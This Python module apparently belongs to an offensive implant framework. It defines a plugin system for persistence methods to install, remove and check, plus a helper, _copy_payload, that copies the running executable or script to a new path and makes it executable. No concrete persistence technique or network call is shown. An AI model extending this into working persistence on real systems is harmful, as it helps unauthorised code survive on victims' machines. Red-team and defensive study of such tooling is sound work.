import os
import shutil
import sys
from abc import ABC, abstractmethod
from dataclasses import dataclass
from typing import Optional


@dataclass
class PersistenceResult:
    success: bool
    method: str
    message: str
    payload_path: Optional[str] = None
    details: Optional[str] = None


class PersistenceMethod(ABC):
    name: str = ''

    @abstractmethod
    def install(self, **kwargs) -> PersistenceResult:
        ...

    @abstractmethod
    def remove(self, **kwargs) -> PersistenceResult:
        ...

    @abstractmethod
    def check(self) -> PersistenceResult:
        ...


class PersistenceManager:
    def __init__(self, platform):
        self._platform = platform
        self._methods: dict[str, PersistenceMethod] = {}

    def register(self, method: PersistenceMethod):
        self._methods[method.name] = method

    def install(self, method_name: str, **kwargs) -> PersistenceResult:
        if method_name not in self._methods:
            return PersistenceResult(False, method_name, f'Unknown method: {method_name}')
        return self._methods[method_name].install(**kwargs)

    def remove(self, method_name: str, **kwargs) -> PersistenceResult:
        if method_name not in self._methods:
            return PersistenceResult(False, method_name, f'Unknown method: {method_name}')
        return self._methods[method_name].remove(**kwargs)

    def check(self, method_name: str = None) -> list[PersistenceResult]:
        if method_name:
            if method_name not in self._methods:
                return [PersistenceResult(False, method_name, f'Unknown method: {method_name}')]
            return [self._methods[method_name].check()]
        return [m.check() for m in self._methods.values()]

    def list_methods(self) -> list[str]:
        return list(self._methods.keys())


def _copy_payload(dest_path: str) -> str:
    if getattr(sys, 'frozen', False):
        shutil.copy2(sys.executable, dest_path)
        os.chmod(dest_path, 0o755)
    else:
        script_path = os.path.abspath(sys.argv[0])
        if not script_path:
            raise ValueError("Cannot determine script path for persistence")
        shutil.copy2(script_path, dest_path)
    return dest_path
